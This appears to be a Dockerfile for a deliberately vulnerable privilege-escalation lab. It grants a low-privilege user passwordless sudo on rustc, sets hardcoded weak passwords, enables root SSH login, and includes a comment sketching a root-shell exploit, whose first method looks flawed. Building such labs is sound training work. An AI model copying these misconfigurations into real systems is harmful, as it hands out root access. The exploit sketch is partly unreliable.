FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_rustc
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/rustc as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and rustc
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        rustc \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify rustc is installed
RUN which rustc && ls -la /usr/bin/rustc

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# rustc can be abused to execute arbitrary code when run as root.
# The exploit approach: create a Rust source file that spawns a root shell:
#   echo 'fn main() { use std::process::Command; Command::new("/bin/bash").arg("-p").status(); }' > /tmp/shell.rs
#   sudo rustc /tmp/shell.rs -o /tmp/shell && /tmp/shell
# Or use rustc's ability to run build scripts / procedural macros to execute
# arbitrary commands at compile time, achieving root code execution.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/rustc" > /etc/sudoers.d/rustc && \
    chmod 440 /etc/sudoers.d/rustc

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]